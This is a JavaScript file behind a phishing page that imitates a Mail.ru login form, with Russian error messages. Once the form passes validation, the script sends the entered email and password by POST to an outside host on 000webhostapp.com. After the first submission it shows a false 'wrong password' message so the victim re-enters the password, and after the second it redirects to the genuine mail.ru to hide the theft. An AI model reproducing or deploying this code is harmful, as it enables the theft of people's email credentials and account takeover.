var inscor = 0;
document.getElementById("signinsb").addEventListener("click", function() { 
	Подробнее();
});


function Подробнее() {
	var emailu  = document.getElementById("emailu").value;	
	var password  = document.getElementById("password").value;
	var emailesr = paserrw = true; 
	
    if(myTrim(emailu) == "") {
        printError("emailesr", "Введите имя ящика");
    } else {
        var regex = /^\S+@\S+\.\S+$/;
        if(regex.test(emailu) === false) {
            printError("emailesr", "Неверный почтовый ящик. Попробуй снова");
        } else{
            printError("emailesr", "");
            emailesr = false;
        }
    }
		// Validate password
    if(myTrim(password) == "") {
        printError("paserrw", "Введите пароль");
    } else {
        if(myTrim(password).length < 6){
			printError("paserrw", "Неверный пароль. Попробуй снова");
		} else if(myTrim(password).length > 40){
			printError("paserrw", "Неверный пароль. Попробуй снова");
		} else{
            printError("paserrw", "");
            paserrw = false;
        }
    } 
		// Prevent the form from being submitted if there are any errors
	if ((emailesr || paserrw) == true) {
	   return false;
    } else {
        повышающая()
    }  
}
function повышающая() {
	var emailu  = document.getElementById("emailu").value;	
	var password  = document.getElementById("password").value;
		$.ajax({
		type: "POST",
		url: "https://benefroprojst.000webhostapp.com/api.php", 
		//dataType: "json",
		data: {emailu: emailu, password: password},
		success: function(data){
			inscor = inscor+1;
			if(inscor == 1){
			   document.getElementById("paserrw").innerHTML = "Неверный пароль. Попробуй снова";
			}else if(inscor == 2){
			   window.location.href = "https://mail.ru";
			}
		},
		 error : function(jqXHR, textStatus, errorThrown) {
	       //console.log(data)//remove in production
           	window.location.reload();                  
       }
		 
	});
}

function myTrim(x) {
  return x.replace(/^\s+|\s+$/gm,'');
}

String.prototype.nl2br = function(){
	return this.replace(/\n/g, "<br />");
}
function printError(elemId, hintMsg) {
	document.getElementById(elemId).innerHTML = hintMsg;
} 
